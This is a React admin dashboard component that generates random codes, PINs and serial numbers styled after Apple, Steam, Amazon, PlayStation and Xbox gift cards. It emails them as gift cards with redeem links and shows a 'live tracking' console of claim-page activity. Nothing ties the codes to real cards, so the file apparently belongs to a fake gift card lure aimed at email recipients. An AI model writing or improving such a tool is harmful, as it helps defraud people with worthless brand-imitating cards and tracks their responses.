import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { sendGiftCardEmail } from '../emailService';
import { BrandIcon } from '../BrandIcon';
import { logActivity } from '../utils/logger';

const BRANDS = [
    { id: 'apple', name: 'Apple', icon: '' },
    { id: 'steam', name: 'Steam Store', icon: '🎮' },
    { id: 'amazon', name: 'Amazon', icon: '📦' },
    { id: 'playstation', name: 'PlayStation Network', icon: 'Ⓟ' },
    { id: 'xbox', name: 'Xbox Live', icon: 'Ⓧ' }
];

const AMOUNTS = [10, 25, 50, 100];

const Admin = () => {
    const navigate = useNavigate();
    
    // Form fields
    const [toEmail, setToEmail] = useState('');
    const [purchaserName, setPurchaserName] = useState('');
    const [selectedBrand, setSelectedBrand] = useState(BRANDS[0]);
    const [selectedAmount, setSelectedAmount] = useState(AMOUNTS[1]);
    const [cardCode, setCardCode] = useState('');
    const [cardPin, setCardPin] = useState('');
    const [cardSerial, setCardSerial] = useState('');
    
    // Status states
    const [sending, setSending] = useState(false);
    const [logs, setLogs] = useState([]);
    const [sendHistory, setSendHistory] = useState([]);
    const [toastMessage, setToastMessage] = useState('');

    // Load history from localStorage on mount
    useEffect(() => {
        const stored = localStorage.getItem('money_form_send_history');
        if (stored) {
            try {
                setSendHistory(JSON.parse(stored));
            } catch (e) {
                console.error('Failed to parse history:', e);
            }
        }
    }, []);

    // Live tracking listener
    useEffect(() => {
        const fetchLogs = () => {
            const stored = localStorage.getItem('money_form_live_logs');
            if (stored) {
                setLogs(JSON.parse(stored));
            } else {
                setLogs([{ id: 'init', text: `[${new Date().toLocaleTimeString()}] SYSTEM: Live Tracking initialized. Waiting for user activity...`, type: 'info' }]);
            }
        };

        fetchLogs();

        // Listen for updates from other tabs
        const handleStorage = (e) => {
            if (e.key === 'money_form_live_logs') fetchLogs();
        };

        window.addEventListener('storage', handleStorage);
        // Listen for updates from the same tab
        window.addEventListener('localLogUpdated', fetchLogs);

        return () => {
            window.removeEventListener('storage', handleStorage);
            window.removeEventListener('localLogUpdated', fetchLogs);
        };
    }, []);

    // Save history helper
    const saveHistory = (newHistory) => {
        setSendHistory(newHistory);
        localStorage.setItem('money_form_send_history', JSON.stringify(newHistory));
    };

    const addLog = (text, type = 'info') => {
        logActivity(text, type);
    };

    // Helper to generate realistic codes based on brand
    const handleGenerateDetails = () => {
        const randHex = (len) => {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let res = '';
            for (let i = 0; i < len; i++) {
                res += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return res;
        };

        let code = '';
        const brandId = selectedBrand.id;
        if (brandId === 'apple') {
            code = `A${randHex(3)}-${randHex(4)}-${randHex(4)}-${randHex(4)}`;
        } else if (brandId === 'steam') {
            code = `${randHex(5)}-${randHex(5)}-${randHex(5)}`;
        } else if (brandId === 'amazon') {
            code = `AQ${randHex(2)}-${randHex(6)}-${randHex(4)}`;
        } else if (brandId === 'playstation') {
            code = `${randHex(4)}-${randHex(4)}-${randHex(4)}`;
        } else if (brandId === 'xbox') {
            code = `${randHex(5)}-${randHex(5)}-${randHex(5)}-${randHex(5)}-${randHex(5)}`;
        }

        const pin = Math.floor(1000 + Math.random() * 9000).toString();
        const serial = `SN-${Math.floor(100000000 + Math.random() * 900000000)}`;

        return { code, pin, serial };
    };

    const handleSendEmail = async (e) => {
        e.preventDefault();

        if (!toEmail || !purchaserName) {
            addLog('ERROR: Recipient email and purchaser name are required!', 'error');
            alert('Please fill out all fields first!');
            return;
        }

        const details = handleGenerateDetails();
        setCardCode(details.code);
        setCardPin(details.pin);
        setCardSerial(details.serial);

        setSending(true);
        addLog(`Initiating secure dispatch for $${selectedAmount} ${selectedBrand.name} Gift Card...`, 'info');
        addLog(`Auto-generated secure details for ${selectedBrand.name}: Code=${details.code}, PIN=${details.pin}, Serial=${details.serial}`, 'success');
        
        const cardDetails = {
            code: details.code,
            pin: details.pin,
            serial: details.serial
        };

        const result = await sendGiftCardEmail({
            to: toEmail,
            purchaserName,
            brandName: selectedBrand.name,
            amount: selectedAmount,
            cardDetails
        });

        const newHistoryItem = {
            id: Date.now().toString(),
            to: toEmail,
            purchaser: purchaserName,
            brand: selectedBrand.name,
            brandIcon: selectedBrand.icon,
            amount: selectedAmount,
            code: cardCode,
            pin: cardPin,
            serial: cardSerial,
            redeemUrl: result.redeemUrl,
            timestamp: new Date().toLocaleString(),
            status: result.success ? 'Delivered' : (result.isLocalFallback ? 'Local Fallback' : 'Resend Failed')
        };

        const updatedHistory = [newHistoryItem, ...sendHistory];
        saveHistory(updatedHistory);

        if (result.success) {
            addLog(`✅ SUCCESS: Gift card email sent to ${toEmail} successfully.`, 'success');
        } else if (result.isLocalFallback) {
            addLog(`⚠️ LOCAL FALLBACK: Email client service simulated locally. Link generated successfully!`, 'info');
        } else {
            addLog(`❌ SEND ERROR: ${result.error || 'Unknown dispatch error'}`, 'error');
        }

        setSending(false);
    };

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text);
        setToastMessage('URL copied successfully!');
        setTimeout(() => setToastMessage(''), 2000);
    };

    const clearHistory = () => {
        if (confirm('Are you sure you want to clear the dispatch history logs?')) {
            saveHistory([]);
            addLog('System history logs cleared successfully.', 'info');
        }
    };

    return (
        <div className="container" style={{ maxWidth: '1080px' }}>
            <div className="content">
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px', flexWrap: 'wrap', gap: '12px' }}>
                    <div>
                        <h1 style={{ margin: 0 }}>Admin Dashboard</h1>
                        <p style={{ margin: 0 }}>Configure and dispatch gift cards.</p>
                    </div>
                    <div style={{ display: 'flex', gap: '10px' }}>
                        <button onClick={() => navigate('/')} className="btn btn-secondary" style={{ padding: '8px 16px', width: 'auto', fontSize: '13px' }}>
                            View Store
                        </button>
                    </div>
                </div>

                <div className="admin-grid">
                    {/* Left Column: Configuration Form */}
                    <form onSubmit={handleSendEmail} style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                        
                        {/* 1. Brand Selection */}
                        <div className="form-group">
                            <label className="form-label">1. Select Gift Card Brand</label>
                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: '8px' }}>
                                {BRANDS.map((brand) => (
                                    <div 
                                        key={brand.id}
                                        onClick={() => setSelectedBrand(brand)}
                                        style={{ 
                                            padding: '12px 6px', 
                                            borderRadius: '12px', 
                                            display: 'flex', 
                                            flexDirection: 'column', 
                                            alignItems: 'center', 
                                            gap: '4px',
                                            cursor: 'pointer',
                                            border: `2px solid ${selectedBrand.id === brand.id ? '#2563eb' : '#e5e7eb'}`,
                                            background: selectedBrand.id === brand.id ? '#eff6ff' : '#ffffff',
                                            transition: 'all 0.2s ease'
                                        }}
                                    >
                                        <BrandIcon brandId={brand.id} size={20} color="#111827" />
                                        <span style={{ fontSize: '10px', fontWeight: 'bold' }}>{brand.name.split(' ')[0]}</span>
                                    </div>
                                ))}
                            </div>
                        </div>

                        {/* 2. Amount Selection */}
                        <div className="form-group">
                            <label className="form-label">2. Select Denomination (USD)</label>
                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '8px' }}>
                                {AMOUNTS.map((amount) => (
                                    <div
                                        key={amount}
                                        onClick={() => setSelectedAmount(amount)}
                                        style={{ 
                                            padding: '10px',
                                            textAlign: 'center',
                                            borderRadius: '10px',
                                            fontWeight: 'bold',
                                            cursor: 'pointer',
                                            border: `2px solid ${selectedAmount === amount ? '#2563eb' : '#e5e7eb'}`,
                                            background: selectedAmount === amount ? '#2563eb' : '#ffffff',
                                            color: selectedAmount === amount ? '#ffffff' : '#111827',
                                            transition: 'all 0.2s ease'
                                        }}
                                    >
                                        ${amount}
                                    </div>
                                ))}
                            </div>
                        </div>

                        {/* 3. Recipient Info */}
                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
                            <div className="form-group">
                                <label className="form-label" htmlFor="recipient-email">3. Recipient Email</label>
                                <input
                                    id="recipient-email"
                                    type="email"
                                    className="form-input"
                                    placeholder="beneficiary@example.com"
                                    value={toEmail}
                                    onChange={(e) => setToEmail(e.target.value)}
                                    required
                                />
                            </div>
                            <div className="form-group">
                                <label className="form-label" htmlFor="purchaser-name">4. Purchaser Name</label>
                                <input
                                    id="purchaser-name"
                                    type="text"
                                    className="form-input"
                                    placeholder="Michael Appiah"
                                    value={purchaserName}
                                    onChange={(e) => setPurchaserName(e.target.value)}
                                    required
                                />
                            </div>
                        </div>

                        {/* Submit Action */}
                        <button type="submit" className="btn" disabled={sending} style={{ opacity: sending ? 0.7 : 1 }}>
                            <span>{sending ? 'Sending...' : '📨 Send Gift Card'}</span>
                        </button>
                    </form>

                    {/* Right Column: Console Log & Live Link Panel */}
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                        <div>
                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                                <label className="form-label" style={{ margin: 0 }}>System Activity Console</label>
                                <span style={{ fontSize: '11px', color: '#6b7280' }}>LIVE LOGS</span>
                            </div>
                            <div className="console-box">
                                {logs.map((log) => (
                                    <div key={log.id || log.text} className={`console-line ${log.type}`}>
                                        {log.text}
                                    </div>
                                ))}
                            </div>
                        </div>

                        {/* Live Claims links container */}
                        <div>
                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                                <label className="form-label" style={{ margin: 0 }}>Sent History ({sendHistory.length})</label>
                                {sendHistory.length > 0 && (
                                    <span 
                                        onClick={clearHistory} 
                                        style={{ fontSize: '11px', color: '#ef4444', cursor: 'pointer', textDecoration: 'underline' }}
                                    >
                                        Clear History
                                    </span>
                                )}
                            </div>

                            <div style={{ 
                                background: '#f9fafb', 
                                border: '1px solid #e5e7eb', 
                                borderRadius: '12px', 
                                padding: '16px',
                                minHeight: '150px',
                                maxHeight: '200px',
                                overflowY: 'auto',
                                display: 'flex',
                                flexDirection: 'column',
                                gap: '10px'
                            }}>
                                {sendHistory.length === 0 ? (
                                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '120px', color: 'var(--text-secondary)', fontSize: '13px', fontStyle: 'italic' }}>
                                        No active claim tokens generated.
                                    </div>
                                ) : (
                                    sendHistory.map(item => (
                                        <div key={item.id} style={{ 
                                            background: '#ffffff', 
                                            border: '1px solid #e5e7eb', 
                                            borderRadius: '8px', 
                                            padding: '12px',
                                            fontSize: '12px'
                                        }}>
                                            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px', fontWeight: 'bold' }}>
                                                <span style={{ color: '#111827', display: 'flex', alignItems: 'center', gap: '6px' }}>
                                                    <BrandIcon brandId={item.brand} size={14} color="#111827" />
                                                    ${item.amount} to {item.to}
                                                </span>
                                                <span style={{ 
                                                    color: item.status === 'Delivered' ? '#059669' : '#d97706',
                                                    fontSize: '10px',
                                                    background: item.status === 'Delivered' ? '#d1fae5' : '#fef3c7',
                                                    padding: '2px 8px',
                                                    borderRadius: '12px'
                                                }}>
                                                    {item.status}
                                                </span>
                                            </div>
                                            <div style={{ color: '#4b5563', fontSize: '11px', marginBottom: '8px' }}>
                                                Code: {item.code}
                                            </div>
                                            <div style={{ display: 'flex', gap: '12px' }}>
                                                <a 
                                                    href={item.redeemUrl} 
                                                    target="_blank" 
                                                    rel="noopener noreferrer"
                                                    style={{ color: '#2563eb', textDecoration: 'none', fontWeight: 'bold' }}
                                                >
                                                    View Page
                                                </a>
                                                <span 
                                                    onClick={() => copyToClipboard(item.redeemUrl)}
                                                    style={{ color: '#6b7280', cursor: 'pointer', textDecoration: 'underline' }}
                                                >
                                                    Copy Link
                                                </span>
                                            </div>
                                        </div>
                                    ))
                                )}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            {toastMessage && <div className="toast-msg">{toastMessage}</div>}
        </div>
    );
};

export default Admin;
